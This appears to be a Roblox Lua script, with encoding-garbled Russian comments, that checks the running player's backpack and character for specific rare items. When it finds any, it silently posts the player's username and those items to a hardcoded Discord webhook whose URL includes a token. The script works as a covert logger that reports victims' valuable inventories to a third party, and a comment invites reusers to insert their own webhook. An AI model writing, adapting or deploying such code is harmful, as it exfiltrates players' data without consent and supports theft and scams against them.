local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")

local localPlayer = Players.LocalPlayer

-- === –°–ø–∏—Å–æ–∫ —Ä–∞–∑—Ä–µ—à—ë–Ω–Ω—ã—Ö —Å–µ–∫—Ä–µ—Ç–æ–∫ ===
local allowItems = {
    "Garamararam",
    "UltraBrain",
    "LegendaryTool",
}

-- === –°–±–æ—Ä –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è —Å —Ñ–∏–ª—å—Ç—Ä–æ–º —Å–µ–∫—Ä–µ—Ç–æ–∫ ===
local function collectInventory()
    local items = {}

    local function addItemsFrom(container)
        if not container then return end
        for _, item in ipairs(container:GetChildren()) do
            if item:IsA("Tool") then
                for _, allowed in ipairs(allowItems) do
                    if item.Name == allowed then
                        table.insert(items, item.Name)
                        break
                    end
                end
            end
        end
    end

    addItemsFrom(localPlayer:FindFirstChild("Backpack"))
    addItemsFrom(localPlayer.Character)

    if #items == 0 then
        return nil -- –Ω–µ—Ç —Å–µ–∫—Ä–µ—Ç–æ–∫
    else
        local invText = "\n--- Inventory ---\n"
        for _, name in ipairs(items) do
            invText = invText .. "- " .. name .. "\n"
        end
        return invText
    end
end

-- === –û—Å–Ω–æ–≤–Ω–æ–π –∑–∞–ø—É—Å–∫ ===
local inventory = collectInventory()
if inventory then
    local brainrots = "‚ùå Brainrots –ø—Ä–æ–≤–µ—Ä–∫–∞ –æ—Ç–∫–ª—é—á–µ–Ω–∞" -- –∏–ª–∏ –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å —Å–≤–æ—é —Ñ—É–Ω–∫—Ü–∏—é
    local content = brainrots .. inventory

    local url = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep" -- —Å—é–¥–∞ —Å–≤–æ–π –≤–µ–±—Ö—É–∫
    local body = HttpService:JSONEncode({
        ["embeds"] = {{
            ["title"] = "**Brainrots | Elly**",
            ["color"] = 65280,
            ["fields"] = {
                {["name"] = "üë§ Username", ["value"] = localPlayer.Name, ["inline"] = false},
                {["name"] = "ü™ê Brainrots \ Plot", ["value"] = content, ["inline"] = false}
            }
        }}
    })
    HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
end
